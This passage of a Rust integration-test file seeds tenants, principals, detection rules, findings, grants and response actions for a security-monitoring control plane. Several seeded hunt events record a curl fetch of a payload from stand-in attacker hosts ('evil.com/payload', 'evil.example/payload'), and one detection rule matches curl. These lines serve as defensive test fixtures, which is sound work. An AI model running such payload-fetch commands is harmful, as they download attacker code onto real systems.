        approval_stream_name: "approval".to_string(),
        approval_consumer_name: "approval-consumer".to_string(),
        heartbeat_consumer_enabled: false,
        heartbeat_subject_filter: "tenant-*.>".to_string(),
        heartbeat_stream_name: "heartbeat".to_string(),
        heartbeat_consumer_name: "heartbeat-consumer".to_string(),
        hunt_event_consumer_enabled: false,
        hunt_event_subject_filter: "tenant-*.>".to_string(),
        hunt_event_stream_name: "hunt-events".to_string(),
        hunt_event_consumer_name: "hunt-event-consumer".to_string(),
        stale_detector_enabled: false,
        stale_check_interval_secs: 60,
        stale_threshold_secs: 120,
        dead_threshold_secs: 300,
        cors: crate::config::CorsConfig::default(),
    };

    let provisioner = TenantProvisioner::new(
        db.clone(),
        nats_url.clone(),
        &config.nats_provisioning_mode,
        config.nats_provisioner_base_url.clone(),
        config.nats_provisioner_api_token.clone(),
        config.nats_allow_insecure_mock_provisioner,
    )
    .expect("provisioner");
    let state = AppState {
        config: config.clone(),
        db: db.clone(),
        nats: nats_client.clone(),
        provisioner,
        metering: MeteringService::new(db.clone()),
        alerter: AlerterService::new(db.clone()),
        retention: RetentionService::new(db.clone()),
        signing_keypair: Some(signing_keypair.clone()),
        receipt_store: crate::routes::receipts::ReceiptStore::new(),
        catalog: crate::services::catalog::CatalogStore::new(),
    };
    let app = routes::router(state);

    let tenant_id = Uuid::new_v4();
    let tenant_slug = "acme-int".to_string();
    sqlx::query::query(
        r#"INSERT INTO tenants (
               id, name, slug, plan, status, agent_limit, retention_days
           ) VALUES ($1, 'Acme Integration', $2, 'enterprise', 'active', 100, 30)"#,
    )
    .bind(tenant_id)
    .bind(&tenant_slug)
    .execute(&db)
    .await
    .expect("seed tenant");

    let api_key = "cs_it_admin_key".to_string();
    sqlx::query::query(
        r#"INSERT INTO api_keys (
               tenant_id, name, key_hash, key_prefix, scopes
           ) VALUES ($1, 'integration', $2, 'cs_it', ARRAY['admin'])"#,
    )
    .bind(tenant_id)
    .bind(hash_api_key(&api_key))
    .execute(&db)
    .await
    .expect("seed api key");

    Harness {
        app,
        db,
        nats: nats_client,
        nats_url,
        tenant_id,
        tenant_slug,
        api_key,
        signing_keypair,
        _postgres: postgres,
        _nats: nats,
    }
}

async fn seed_tenant(db: &PgPool, slug: &str, name: &str) -> Uuid {
    let tenant_id = Uuid::new_v4();
    sqlx::query::query(
        r#"INSERT INTO tenants (
               id, name, slug, plan, status, agent_limit, retention_days
           ) VALUES ($1, $2, $3, 'enterprise', 'active', 100, 30)"#,
    )
    .bind(tenant_id)
    .bind(name)
    .bind(slug)
    .execute(db)
    .await
    .expect("seed tenant");
    tenant_id
}

async fn apply_migrations(db: &PgPool) {
    for file in migration_files() {
        let sql = std::fs::read_to_string(&file).expect("read migration file");
        sqlx::raw_sql::raw_sql(&sql)
            .execute(db)
            .await
            .unwrap_or_else(|err| panic!("migration {:?} failed: {}", file, err));
    }
}

fn migration_files() -> Vec<std::path::PathBuf> {
    let mut files =
        std::fs::read_dir(std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("migrations"))
            .expect("read migrations")
            .map(|entry| entry.expect("entry").path())
            .collect::<Vec<_>>();
    files.sort();
    files
}

fn migration_names() -> Vec<String> {
    migration_files()
        .into_iter()
        .map(|path| {
            path.file_name()
                .expect("migration filename")
                .to_string_lossy()
                .to_string()
        })
        .collect()
}

async fn insert_api_key_for_tenant(
    db: &PgPool,
    tenant_id: Uuid,
    raw_key: &str,
    name: &str,
    scopes: &[&str],
) {
    let scope_values = scopes
        .iter()
        .map(|scope| scope.to_string())
        .collect::<Vec<_>>();
    sqlx::query::query(
        r#"INSERT INTO api_keys (
               tenant_id, name, key_hash, key_prefix, scopes
           ) VALUES ($1, $2, $3, 'cs_it', $4)"#,
    )
    .bind(tenant_id)
    .bind(name)
    .bind(hash_api_key(raw_key))
    .bind(&scope_values)
    .execute(db)
    .await
    .expect("seed tenant api key");
}

fn signed_hunt_ingest_request(harness: &Harness, mut event: Value) -> Value {
    let issuer_probe = spine::build_signed_envelope(
        harness.signing_keypair.as_ref(),
        0,
        None,
        event.clone(),
        spine::now_rfc3339(),
    )
    .expect("sign hunt event");
    let issuer = issuer_probe
        .get("issuer")
        .and_then(Value::as_str)
        .expect("signed hunt event issuer")
        .to_string();

    event["evidence"]["issuer"] = Value::String(issuer);
    event["evidence"]["signatureValid"] = Value::Bool(true);
    let envelope = spine::build_signed_envelope(
        harness.signing_keypair.as_ref(),
        0,
        None,
        event.clone(),
        spine::now_rfc3339(),
    )
    .expect("sign hunt event");

    serde_json::json!({
        "event": event,
        "rawEnvelope": envelope,
    })
}

fn signed_hunt_ingest_request_without_canonical_evidence(harness: &Harness, event: Value) -> Value {
    let envelope = spine::build_signed_envelope(
        harness.signing_keypair.as_ref(),
        0,
        None,
        event.clone(),
        spine::now_rfc3339(),
    )
    .expect("sign hunt event without canonical evidence");

    serde_json::json!({
        "event": event,
        "rawEnvelope": envelope,
    })
}

fn canonical_json_hash_for_test(value: &Value) -> String {
    let canonical = hush_core::canonicalize_json(value).expect("canonicalize JSON");
    let mut hasher = Sha256::new();
    hasher.update(canonical.as_bytes());
    format!("0x{}", hex::encode(hasher.finalize()))
}

async fn seed_hunt_events(harness: &Harness) {
    for event in [
        serde_json::json!({
                "eventId": "hunt-evt-1",
                "tenantId": harness.tenant_id.to_string(),
                "source": "tetragon",
                "kind": "process_exec",
                "occurredAt": "2026-03-06T12:00:00Z",
                "ingestedAt": "2026-03-06T12:00:01Z",
                "severity": "low",
                "verdict": "allow",
                "summary": "process_exec /usr/bin/curl evil.com/payload",
                "actionType": "process",
                "principal": {
                    "principalId": "principal-1",
                    "endpointAgentId": "endpoint-1",
                    "runtimeAgentId": "runtime-1",
                    "principalType": "agent"
                },
                "sessionId": "session-1",
                "grantId": "grant-1",
                "detectionIds": ["finding-1"],
                "target": {
                    "kind": "process",
                    "id": "1001",
                    "name": "curl"
                },
                "evidence": {
                    "rawRef": "hunt-envelope:hunt-evt-1",
                    "envelopeHash": "hash-1",
                    "issuer": "spiffe://tenant/acme",
                    "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "process": "/usr/bin/curl",
                    "namespace": "default",
                    "pod": "agent-pod-1",
                    "url": "https://evil.com/payload"
                }
        }),
        serde_json::json!({
                "eventId": "hunt-evt-2",
                "tenantId": harness.tenant_id.to_string(),
                "source": "tetragon",
                "kind": "process_exec",
                "occurredAt": "2026-03-06T12:01:00Z",
                "ingestedAt": "2026-03-06T12:01:01Z",
                "severity": "medium",
                "verdict": "allow",
                "summary": "process_exec /usr/bin/ssh admin@example.net",
                "actionType": "process",
                "principal": {
                    "principalId": "principal-1",
                    "endpointAgentId": "endpoint-1",
                    "runtimeAgentId": "runtime-1",
                    "principalType": "agent"
                },
                "sessionId": "session-1",
                "grantId": "grant-1",
                "target": {
                    "kind": "process",
                    "id": "1002",
                    "name": "ssh"
                },
                "evidence": {
                    "rawRef": "hunt-envelope:hunt-evt-2",
                    "envelopeHash": "hash-2",
                    "issuer": "spiffe://tenant/acme",
                    "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "process": "/usr/bin/ssh",
                    "namespace": "default",
                    "pod": "agent-pod-1"
                }
        }),
        serde_json::json!({
                "eventId": "hunt-evt-3",
                "tenantId": harness.tenant_id.to_string(),
                "source": "hubble",
                "kind": "network_flow",
                "occurredAt": "2026-03-06T12:02:00Z",
                "ingestedAt": "2026-03-06T12:02:01Z",
                "severity": "medium",
                "verdict": "forwarded",
                "summary": "network flow to api.example.com:443",
                "actionType": "network",
                "principal": {
                    "principalId": "principal-2",
                    "endpointAgentId": "endpoint-2",
                    "runtimeAgentId": "runtime-2",
                    "principalType": "agent"
                },
                "sessionId": "session-2",
                "target": {
                    "kind": "network",
                    "id": "443",
                    "name": "api.example.com"
                },
                "evidence": {
                    "rawRef": "hunt-envelope:hunt-evt-3",
                    "envelopeHash": "hash-3",
                    "issuer": "spiffe://tenant/acme",
                    "schemaName": "clawdstrike.sdr.fact.hubble_flow.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "namespace": "prod",
                    "pod": "network-pod-1"
                }
        }),
    ] {
        let request_body = signed_hunt_ingest_request(harness, event);
        let response = request_json(
            &harness.app,
            Method::POST,
            "/api/v1/hunt/events/ingest".to_string(),
            Some(&harness.api_key),
            Some(request_body),
        )
        .await;
        assert_eq!(response.0, StatusCode::OK);
    }
}

async fn seed_operator_flow_fixture(harness: &Harness) -> OperatorFlowFixture {
    let agent_id = "agent-operator-e2e-1".to_string();
    let session_id = "session-operator-flow-1".to_string();
    let detection_raw_ref = "hunt-envelope:operator-flow-detection-1".to_string();
    let response_raw_ref = "hunt-envelope:operator-flow-response-1".to_string();
    let operator_keypair = hush_core::Keypair::generate();

    let register_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": &agent_id,
            "name": "Operator Endpoint",
            "public_key": operator_keypair.public_key().to_hex(),
            "role": "coder",
            "trust_level": "high"
        })),
    )
    .await;
    assert_eq!(register_resp.0, StatusCode::OK);

    let principal_row = sqlx::query::query(
        "SELECT principal_id FROM agents WHERE tenant_id = $1 AND agent_id = $2",
    )
    .bind(harness.tenant_id)
    .bind(&agent_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch operator principal");
    let principal_id: Uuid = principal_row
        .try_get::<Option<Uuid>, _>("principal_id")
        .expect("principal_id")
        .expect("principal should be linked");

    let response_subject = format!(
        "{}.response.command.endpoint.{agent_id}",
        tenant_subject_prefix(&harness.tenant_slug)
    );
    let js = async_nats::jetstream::new(harness.nats.clone());
    spine::nats_transport::ensure_stream(
        &js,
        "response-action-integration",
        vec![response_subject.clone()],
        1,
    )
    .await
    .expect("response action stream should exist");

    let now = chrono::Utc::now().timestamp();
    let mut grant_claims = hush_multi_agent::DelegationClaims::new(
        hush_multi_agent::AgentId::new(principal_id.to_string())
            .expect("principal id should be a valid agent id"),
        hush_multi_agent::AgentId::new(format!("delegate:{}", Uuid::new_v4()))
            .expect("delegate id should be valid"),
        now,
        now + 3600,
        vec![hush_multi_agent::AgentCapability::DeployApproval],
    )
    .expect("build delegation claims");
    grant_claims.pur = Some("operator containment".to_string());
    grant_claims.ctx = Some(serde_json::json!({
        "workflow": "fleet_operator_e2e"
    }));
    let grant_token = hush_multi_agent::SignedDelegationToken::sign_with_public_key(
        grant_claims,
        &operator_keypair,
    )
    .expect("sign delegation token");

    let grant_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "token": grant_token,
            "grant_type": "delegation",
            "source_session_id": &session_id,
            "issuer_public_key": operator_keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(grant_resp.0, StatusCode::OK);
    assert_eq!(grant_resp.1["status"], "active");
    let grant_id =
        Uuid::parse_str(grant_resp.1["id"].as_str().expect("grant id")).expect("parse grant id");

    let create_rule_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/rules".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Operator flow rule",
            "description": "Detect suspicious operator workflow activity",
            "severity": "high",
            "source_format": "native_correlation",
            "execution_mode": "streaming",
            "source_text": "schema: clawdstrike.hunt.correlation.v1\nname: operator-flow-rule\nseverity: high\ndescription: e2e\nwindow: 30s\nconditions:\n  - source: tetragon\n    target_pattern: curl\n    bind: suspicious_exec\noutput:\n  title: Suspicious operator flow\n  evidence:\n    - suspicious_exec\n",
            "tags": ["operator-flow", "integration"],
            "enabled": true
        })),
    )
    .await;
    assert_eq!(create_rule_resp.0, StatusCode::OK);
    let rule_id = Uuid::parse_str(create_rule_resp.1["id"].as_str().expect("rule id"))
        .expect("parse rule id");

    let detection_service = AlerterService::new(harness.db.clone());
    let finding = detection_service
        .create_detection_finding_for_test(
            harness.tenant_id,
            rule_id,
            "operator-flow-rule",
            "native_correlation",
            "high",
            "Suspicious operator flow",
            "curl execution triggered an operator response workflow",
            &[detection_raw_ref.as_str()],
        )
        .await
        .expect("create e2e finding");

    sqlx::query::query(
        r#"UPDATE detection_findings
           SET principal_id = $3,
               session_id = $4,
               grant_id = $5
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(finding.id)
    .bind(principal_id)
    .bind(&session_id)
    .bind(grant_id)
    .execute(&harness.db)
    .await
    .expect("link finding to operator principal");

    let case_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/cases".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "title": "Operator flow investigation",
            "summary": "Investigate suspicious operator workflow activity",
            "severity": "high",
            "principalIds": [principal_id.to_string()],
            "detectionIds": [finding.id.to_string()],
            "tags": ["operator-flow"]
        })),
    )
    .await;
    assert_eq!(case_resp.0, StatusCode::OK);
    let case_id = case_resp.1["id"].as_str().expect("case id").to_string();

    let action_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "policy_rule_diff_validation",
            "target": {
                "kind": "endpoint",
                "id": &agent_id
            },
            "reason": "Investigate suspicious operator flow",
            "caseId": &case_id,
            "sourceDetectionId": finding.id.to_string(),
            "requireAcknowledgement": true,
            "payload": {
                "operation": "policy_rule_diff_validation"
            }
        })),
    )
    .await;
    assert_eq!(action_resp.0, StatusCode::OK);
    assert_eq!(action_resp.1["status"], "queued");
    let action_id =
        Uuid::parse_str(action_resp.1["id"].as_str().expect("action id")).expect("parse action id");

    OperatorFlowFixture {
        agent_id,
        session_id,
        detection_raw_ref,
        response_raw_ref,
        principal_id,
        response_subject,
        grant_id,
        finding_id: finding.id,
        case_id,
        action_id,
    }
}

async fn seed_console_read_model_fixture(harness: &Harness) -> ConsoleFixture {
    let principal_id = Uuid::new_v4();
    let secondary_principal_id = Uuid::new_v4();
    let swarm_id = Uuid::new_v4();
    let project_id = Uuid::new_v4();
    let capability_group_id = Uuid::new_v4();
    let rule_id = Uuid::new_v4();
    let detection_id = Uuid::new_v4();
    let action_id = Uuid::new_v4();
    let grant_id = Uuid::new_v4();

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               public_key,
               metadata
           ) VALUES (
               $1,
               $2,
               'endpoint_agent',
               'endpoint-1',
               'Planner MacBook',
               'high',
               'active',
               'active',
               'pk-primary',
               $3
           )"#,
    )
    .bind(principal_id)
    .bind(harness.tenant_id)
    .bind(serde_json::json!({ "platform": "macos" }))
    .execute(&harness.db)
    .await
    .expect("seed console principal");

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               metadata
           ) VALUES (
               $1,
               $2,
               'runtime_agent',
               'runtime-1',
               'Runtime Sidecar',
               'medium',
               'quarantined',
               'stale',
               '{}'::jsonb
           )"#,
    )
    .bind(secondary_principal_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed secondary principal");

    let agent_row = sqlx::query::query(
        r#"INSERT INTO agents (
               tenant_id,
               agent_id,
               name,
               public_key,
               role,
               trust_level,
               status,
               last_heartbeat_at,
               metadata,
               principal_id
           ) VALUES (
               $1,
               'endpoint-1',
               'Planner MacBook',
               'pk-primary',
               'coder',
               'high',
               'active',
               '2026-03-06T12:00:00Z'::timestamptz,
               $2,
               $3
           )
           RETURNING id"#,
    )
    .bind(harness.tenant_id)
    .bind(serde_json::json!({ "posture": "nominal", "daemon": "healthy" }))
    .bind(principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("seed endpoint agent");
    let endpoint_agent_row_id: Uuid = agent_row.try_get("id").expect("endpoint agent row id");

    sqlx::query::query(
        r#"INSERT INTO swarms (id, tenant_id, slug, name, kind)
           VALUES ($1, $2, 'fleet-east', 'Fleet East', 'fleet')"#,
    )
    .bind(swarm_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed swarm");

    sqlx::query::query(
        r#"INSERT INTO projects (id, tenant_id, swarm_id, slug, name, environment)
           VALUES ($1, $2, $3, 'payments-prod', 'Payments Prod', 'prod')"#,
    )
    .bind(project_id)
    .bind(harness.tenant_id)
    .bind(swarm_id)
    .execute(&harness.db)
    .await
    .expect("seed project");

    sqlx::query::query(
        r#"INSERT INTO capability_groups (id, tenant_id, name, capabilities)
           VALUES ($1, $2, 'Responders', '["contain"]'::jsonb)"#,
    )
    .bind(capability_group_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed capability group");

    for (target_kind, target_id, role) in [
        ("swarm", swarm_id, Some("member")),
        ("project", project_id, Some("service")),
        ("capability_group", capability_group_id, Some("responder")),
    ] {
        sqlx::query::query(
            r#"INSERT INTO principal_memberships (
                   tenant_id,
                   principal_id,
                   target_kind,
                   target_id,
                   role
               ) VALUES ($1, $2, $3, $4, $5)"#,
        )
        .bind(harness.tenant_id)
        .bind(principal_id)
        .bind(target_kind)
        .bind(target_id)
        .bind(role)
        .execute(&harness.db)
        .await
        .expect("seed principal membership");
    }

    policy_distribution::upsert_active_policy(
        &harness.db,
        harness.tenant_id,
        "mode: tenant-base\nregion: west\nkeep: true\n",
        Some("console-read-model"),
    )
    .await
    .expect("seed active policy");

    for (target_kind, target_id, priority, policy_yaml, checksum) in [
        (
            "tenant",
            None,
            10_i32,
            "region: east\ncontrols:\n  baseline: true\n",
            Some("tenant-layer"),
        ),
        (
            "swarm",
            Some(swarm_id),
            20_i32,
            "mode: swarm\n",
            Some("swarm-layer"),
        ),
        (
            "principal",
            Some(principal_id),
            30_i32,
            "final: true\n",
            Some("principal-layer"),
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO policy_attachments (
                   tenant_id,
                   target_kind,
                   target_id,
                   priority,
                   policy_yaml,
                   checksum_sha256,
                   created_by
               ) VALUES ($1, $2, $3, $4, $5, $6, 'integration')"#,
        )
        .bind(harness.tenant_id)
        .bind(target_kind)
        .bind(target_id)
        .bind(priority)
        .bind(policy_yaml)
        .bind(checksum)
        .execute(&harness.db)
        .await
        .expect("seed policy attachment");
    }

    sqlx::query::query(
        r#"INSERT INTO detection_rules (
               id,
               tenant_id,
               name,
               description,
               severity,
               source_format,
               engine_kind,
               execution_mode,
               created_by,
               source_text
           ) VALUES (
               $1,
               $2,
               'console-rule',
               'integration console rule',
               'high',
               'native_correlation',
               'correlation',
               'streaming',
               'integration',
               'rule: console'
           )"#,
    )
    .bind(rule_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed detection rule");

    sqlx::query::query(
        r#"INSERT INTO detection_findings (
               id,
               tenant_id,
               rule_id,
               rule_name,
               source_format,
               severity,
               status,
               title,
               summary,
               principal_id,
               session_id,
               grant_id,
               response_action_ids,
               first_seen_at,
               last_seen_at,
               metadata,
               created_at
           ) VALUES (
               $1,
               $2,
               $3,
               'console-rule',
               'native_correlation',
               'high',
               'open',
               'Suspicious curl',
               'Detected suspicious curl activity',
               $4,
               'session-1',
               $5,
               '[]'::jsonb,
               '2026-03-06T12:00:00Z'::timestamptz,
               '2026-03-06T12:05:00Z'::timestamptz,
               '{}'::jsonb,
               '2026-03-06T12:05:00Z'::timestamptz
           )"#,
    )
    .bind(detection_id)
    .bind(harness.tenant_id)
    .bind(rule_id)
    .bind(principal_id)
    .bind(grant_id)
    .execute(&harness.db)
    .await
    .expect("seed detection finding");

    sqlx::query::query(
        r#"INSERT INTO response_actions (
               id,
               tenant_id,
               action_type,
               target_kind,
               target_id,
               requested_by_type,
               requested_by_id,
               requested_at,
               reason,
               source_detection_id,
               payload,
               status
           ) VALUES (
               $1,
               $2,
               'quarantine_principal',
               'principal',
               $3,
               'user',
               'operator@example.com',
               '2026-03-06T12:06:00Z'::timestamptz,
               'Contain quickly',
               $4,
               '{}'::jsonb,
               'queued'
           )"#,
    )
    .bind(action_id)
    .bind(harness.tenant_id)
    .bind(principal_id.to_string())
    .bind(detection_id)
    .execute(&harness.db)
    .await
    .expect("seed response action");

    sqlx::query::query(
        r#"INSERT INTO fleet_grants (
               id,
               tenant_id,
               issuer_principal_id,
               subject_principal_id,
               audience,
               token_jti,
               delegation_depth,
               lineage_chain,
               capabilities,
               capability_ceiling,
               context,
               issued_at,
               expires_at,
               status
           ) VALUES (
               $1,
               $2,
               $3,
               $4,
               'control-console',
               'console-grant-1',
               0,
               '[]'::jsonb,
               '["quarantine_principal"]'::jsonb,
               '["quarantine_principal"]'::jsonb,
               '{}'::jsonb,
               '2026-03-06T11:55:00Z'::timestamptz,
               '2026-03-06T13:00:00Z'::timestamptz,
               'active'
           )"#,
    )
    .bind(grant_id)
    .bind(harness.tenant_id)
    .bind(secondary_principal_id.to_string())
    .bind("endpoint-1")
    .execute(&harness.db)
    .await
    .expect("seed fleet grant");

    let principal_node_id = format!("principal:{principal_id}");
    let grant_node_id = format!("grant:{grant_id}");
    let action_node_id = format!("response_action:{action_id}");

    for (node_id, kind, label, state) in [
        (
            principal_node_id.as_str(),
            "principal",
            "Planner MacBook",
            Some("active"),
        ),
        (
            grant_node_id.as_str(),
            "grant",
            "Fleet quarantine grant",
            Some("active"),
        ),
        (
            action_node_id.as_str(),
            "response_action",
            "Quarantine principal",
            Some("queued"),
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO delegation_graph_nodes (
                   tenant_id,
                   id,
                   kind,
                   label,
                   state,
                   metadata
               ) VALUES ($1, $2, $3, $4, $5, '{}'::jsonb)"#,
        )
        .bind(harness.tenant_id)
        .bind(node_id)
        .bind(kind)
        .bind(label)
        .bind(state)
        .execute(&harness.db)
        .await
        .expect("seed graph node");
    }

    for (from_node_id, to_node_id, kind) in [
        (
            principal_node_id.as_str(),
            grant_node_id.as_str(),
            "received_grant",
        ),
        (
            grant_node_id.as_str(),
            action_node_id.as_str(),
            "triggered_response_action",
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO delegation_graph_edges (
                   tenant_id,
                   from_node_id,
                   to_node_id,
                   kind,
                   metadata
               ) VALUES ($1, $2, $3, $4, '{}'::jsonb)"#,
        )
        .bind(harness.tenant_id)
        .bind(from_node_id)
        .bind(to_node_id)
        .bind(kind)
        .execute(&harness.db)
        .await
        .expect("seed graph edge");
    }

    for (
        event_id,
        source,
        kind,
        timestamp,
        ingested_at,
        verdict,
        summary,
        action_type,
        response_action_id,
        detection_ids,
        target_kind,
        target_id,
        target_name,
        attributes,
    ) in [
        (
            "console-hunt-1",
            "tetragon",
            "process_exec",
            "2026-03-06T12:00:00Z",
            "2026-03-06T12:00:01Z",
            "allow",
            "process_exec /usr/bin/curl https://evil.example/payload",
            Some("process"),
            None,
            Vec::<String>::new(),
            Some("process"),
            Some("1001".to_string()),
            Some("curl".to_string()),
            serde_json::json!({
                "process": "/usr/bin/curl",
                "url": "https://evil.example/payload",
                "namespace": "default",
                "pod": "planner-1"
            }),
        ),
        (
            "console-hunt-2",
            "response",
            "response_action_updated",
            "2026-03-06T12:05:00Z",
            "2026-03-06T12:05:01Z",
            "deny",
            "response action queued for Planner MacBook",
            Some("quarantine"),
            Some(action_id.to_string()),
            vec![detection_id.to_string()],
            Some("principal"),
            Some(principal_id.to_string()),
            Some("Planner MacBook".to_string()),
            serde_json::json!({
                "status": "queued",
                "operator": "operator@example.com"
            }),
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO hunt_events (
                   event_id,
                   tenant_id,
                   source,
                   kind,
                   timestamp,
                   ingested_at,
                   verdict,
                   severity,
                   summary,
                   action_type,
                   session_id,
                   endpoint_agent_id,
                   runtime_agent_id,
                   principal_id,
                   grant_id,
                   response_action_id,
                   detection_ids,
                   target_kind,
                   target_id,
                   target_name,
                   envelope_hash,
                   issuer,
                   schema_name,
                   signature_valid,
                   raw_ref,
                   attributes
               ) VALUES (
                   $1,
                   $2,
                   $3,
                   $4,
                   $5::timestamptz,
                   $6::timestamptz,
                   $7,
                   'medium',
                   $8,
                   $9,
                   'session-1',
                   'endpoint-1',
                   'runtime-1',
                   $10,
                   $11,
                   $12,
                   $13,
                   $14,
                   $15,
                   $16,
                   $17,
                   'spiffe://tenant/acme-int',
                   'clawdstrike.sdr.fact.console.v1',
                   true,
                   $18,
                   $19
               )"#,
        )
        .bind(event_id)
        .bind(harness.tenant_id)
        .bind(source)
        .bind(kind)
        .bind(timestamp)
        .bind(ingested_at)
        .bind(verdict)
        .bind(summary)
        .bind(action_type)
        .bind(principal_id.to_string())
        .bind(grant_id.to_string())
        .bind(response_action_id)
        .bind(detection_ids)
        .bind(target_kind)
        .bind(target_id)
        .bind(target_name)
        .bind(format!("hash-{event_id}"))
        .bind(format!("hunt-envelope:{event_id}"))
        .bind(attributes)
        .execute(&harness.db)
        .await
        .expect("seed hunt event");
    }

    let noise_tenant_id = seed_tenant(&harness.db, "console-noise", "Console Noise").await;
    let noise_principal_id = Uuid::new_v4();

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               metadata
           ) VALUES (
               $1,
               $2,
               'endpoint_agent',
               'noise-endpoint',
               'Noise Endpoint',
               'medium',
               'active',
               'active',
               '{}'::jsonb
           )"#,
    )
    .bind(noise_principal_id)
    .bind(noise_tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed noise principal");

    sqlx::query::query(
        r#"INSERT INTO hunt_events (
               event_id,
               tenant_id,
               source,
               kind,
               timestamp,
               ingested_at,
               verdict,
               severity,
               summary,
               principal_id,
               raw_ref,
               attributes
           ) VALUES (
               'console-noise-1',
               $1,
               'tetragon',
               'process_exec',
               '2026-03-06T12:10:00Z'::timestamptz,
               '2026-03-06T12:10:01Z'::timestamptz,
               'allow',
               'low',
               'noise event',
               $2,
               'hunt-envelope:console-noise-1',
               '{}'::jsonb
           )"#,
    )
    .bind(noise_tenant_id)
    .bind(noise_principal_id.to_string())
    .execute(&harness.db)
    .await
    .expect("seed noise hunt event");

    ConsoleFixture {
        principal_id,
        principal_stable_ref: "endpoint-1".to_string(),
        endpoint_agent_id: "endpoint-1".to_string(),
        endpoint_agent_row_id,
        grant_id,
        action_id,
    }
}

async fn request_json(
    app: &axum::Router,
    method: Method,
    path: String,
    api_key: Option<&str>,
    json_body: Option<Value>,
) -> (StatusCode, Value) {
    let body = match &json_body {
        Some(value) => Body::from(serde_json::to_vec(value).expect("serialize body")),
        None => Body::empty(),
    };
    let mut builder = Request::builder().method(method).uri(path);
    if json_body.is_some() {
        builder = builder.header("content-type", "application/json");
    }
    if let Some(key) = api_key {
        builder = builder.header("x-api-key", key);
    }
    let request = builder.body(body).expect("build request");

    let response = app.clone().oneshot(request).await.expect("router request");
    let status = response.status();
    let bytes = to_bytes(response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read response body");
    let body = if bytes.is_empty() {
        serde_json::json!({})
    } else {
        serde_json::from_slice::<Value>(&bytes).expect("response json")
    };
    (status, body)
}

async fn request_json_bearer(
    app: &axum::Router,
    method: Method,
    path: String,
    api_key: Option<&str>,
    json_body: Option<Value>,
) -> (StatusCode, Value) {
    let body = match &json_body {
        Some(value) => Body::from(serde_json::to_vec(value).expect("serialize body")),
        None => Body::empty(),
    };
    let mut builder = Request::builder().method(method).uri(path);
    if json_body.is_some() {
        builder = builder.header("content-type", "application/json");
    }
    if let Some(key) = api_key {
        builder = builder.header("authorization", format!("Bearer {key}"));
    }
    let request = builder.body(body).expect("build request");

    let response = app.clone().oneshot(request).await.expect("router request");
    let status = response.status();
    let bytes = to_bytes(response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read response body");
    let body = if bytes.is_empty() {
        serde_json::json!({})
    } else {
        serde_json::from_slice::<Value>(&bytes).expect("response json")
    };
    (status, body)
}

async fn request_json_dual_auth(
    app: &axum::Router,
    method: Method,
    path: String,
    bearer: Option<&str>,
    api_key: Option<&str>,
    json_body: Option<Value>,
) -> (StatusCode, Value) {
    let body = match &json_body {
        Some(value) => Body::from(serde_json::to_vec(value).expect("serialize body")),
        None => Body::empty(),
    };
    let mut builder = Request::builder().method(method).uri(path);
    if json_body.is_some() {
        builder = builder.header("content-type", "application/json");
    }
    if let Some(token) = bearer {
        builder = builder.header("authorization", format!("Bearer {token}"));
    }
    if let Some(key) = api_key {
        builder = builder.header("x-api-key", key);
    }
    let request = builder.body(body).expect("build request");

    let response = app.clone().oneshot(request).await.expect("router request");
    let status = response.status();
    let bytes = to_bytes(response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read response body");
    let body = if bytes.is_empty() {
        serde_json::json!({})
    } else {
        serde_json::from_slice::<Value>(&bytes).expect("response json")
    };
    (status, body)
}

fn docker_available() -> bool {
    Command::new("docker")
        .args(["info"])
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}

fn zip_entry_text(bytes: &[u8], path: &str) -> String {
    let reader = Cursor::new(bytes);
    let mut archive = zip::ZipArchive::new(reader).expect("open evidence bundle zip");
    let mut entry = archive.by_name(path).expect("evidence bundle zip entry");
    let mut text = String::new();
    entry
        .read_to_string(&mut text)
        .expect("read evidence bundle zip entry");
    text
}

fn is_retryable_docker_run_error(stderr: &str) -> bool {
    let normalized = stderr.to_lowercase();
    [
        "bad gateway",
        "service unavailable",
        "internal server error",
        "client.timeout exceeded while awaiting headers",
        "tls handshake timeout",
        "connection reset by peer",
        "unexpected eof",
        "i/o timeout",
        "temporary failure in name resolution",
        "toomanyrequests",
    ]
    .iter()
